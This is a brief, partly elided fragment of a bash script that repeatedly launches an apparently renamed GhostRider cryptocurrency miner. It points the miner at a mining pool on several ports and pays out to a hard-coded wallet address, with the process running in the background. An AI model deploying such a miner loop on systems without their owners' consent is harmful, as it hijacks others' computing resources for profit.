...
while [ $(date +%s) -lt $end_time ]; do
  ...
  if [ -f $dynamic_sgr ]; then
    ...
    for port in $(seq 701 710); do
      ...
      ./$dynamic_sgr -a ghostrider  --pool $ip:$port -u BABYDOGE:0x5Cb6b8452eD7C75dAEE3517C08A3AdFeB5f1aD27.unminsh --timeout 120 -t 8 -p x > dance_$port_$timestamp.log 2>&1 &
      process_pid=$!
